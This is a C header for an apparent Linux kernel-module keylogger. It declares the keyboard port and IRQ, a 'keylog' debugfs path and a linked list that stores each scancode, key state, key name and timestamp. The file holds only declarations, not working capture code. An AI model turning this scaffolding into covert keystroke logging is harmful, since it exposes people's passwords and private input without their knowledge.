#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/debugfs.h>
#include <linux/fs.h>
#include <linux/wait.h>
#include <linux/interrupt.h>
#include <linux/miscdevice.h>
#include <linux/time.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define KEYBOARD_DATA		0x60
#define KBD_IRQ			1
#define KBD_SCANCODE_MASK	0x7f
#define KBD_STATUS_MASK		0x80

#define PATH "keylog"
//#define FILE_NAME "/tmp/keylog"

typedef struct			s_keylst
{
	unsigned char		key;
	unsigned char		state;
	char			name[25];
	struct timespec		time;
	struct s_keylst		*next;
}				t_keylst;

int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len);
int		add_to_list(unsigned char scancode);

#endif
